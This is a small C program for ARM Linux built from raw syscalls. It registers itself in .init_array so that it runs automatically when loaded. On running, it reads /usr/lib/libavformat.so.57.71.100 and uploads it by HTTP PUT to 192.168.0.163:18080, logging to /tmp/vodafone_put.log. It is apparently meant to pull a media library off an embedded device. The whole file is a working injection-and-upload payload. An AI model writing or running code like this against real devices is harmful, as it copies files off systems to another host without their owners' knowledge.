typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

void *memcpy(void*d,const void*s,unsigned n){u8*o=d;const u8*i=s;while(n--)*o++=*i++;return d;}

static long sc(long n,long a,long b,long c){
 register long r7 __asm__("r7")=n,r0 __asm__("r0")=a,r1 __asm__("r1")=b,r2 __asm__("r2")=c;
 __asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2):"memory"); return r0;
}
static u32 slen(const char*s){u32 n=0;while(s[n])n++;return n;}
static void mark(char c,long v){char b[12];int i;long f;b[0]=c;b[1]='=';for(i=7;i>=0;i--){int x=(v>>(i*4))&15;b[9-i]=x<10?'0'+x:'a'+x-10;}b[10]='\n';f=sc(5,(long)"/tmp/vodafone_put.log",0x441,0666);if(f>=0){sc(19,f,0,2);sc(4,f,(long)b,11);sc(6,f,0,0);}}
static int putall(int fd,const char*p,u32 n){while(n){long q=sc(4,fd,(long)p,n);if(q<=0)return -1;p+=q;n-=q;}return 0;}
static char *copy(char*d,const char*s){while(*s)*d++=*s++;return d;}

static void run(void){
 const char src[]="/usr/lib/libavformat.so.57.71.100";
 const char dst[]="/libavformat.so.57.71.100";
 struct {u16 family;u16 port;u32 address;u8 zero[8];} a={2,0xa046,0xa300a8c0,{0}};
 char h[256],b[16384],*p=h; long f,s,n,size;
 f=sc(5,(long)src,0,0);mark('f',f);if(f<0)return;
 size=sc(19,f,0,2);mark('z',size);if(size<0){sc(6,f,0,0);return;}sc(19,f,0,0);
 s=sc(281,2,1,0);mark('s',s);if(s<0){sc(6,f,0,0);return;}
 {long q=sc(283,s,(long)&a,16);mark('c',q);if(q<0){sc(6,s,0,0);sc(6,f,0,0);return;}}
 if(size!=1412440)goto done;
 p=copy(p,"PUT ");p=copy(p,dst);p=copy(p," HTTP/1.0\r\nHost: 192.168.0.163\r\nContent-Length: 1412440\r\nConnection: close\r\n\r\n");
 {long q=putall(s,h,p-h);mark('h',q);if(q<0)goto done;}
 while((n=sc(3,f,(long)b,sizeof(b)))>0)if(putall(s,b,n)<0)break;
done: mark('d',0);sc(6,s,0,0);sc(6,f,0,0);
}
__attribute__((section(".init_array"),used)) static void(*init_entry)(void)=run;
void _start(void){run();sc(1,0,0,0);}
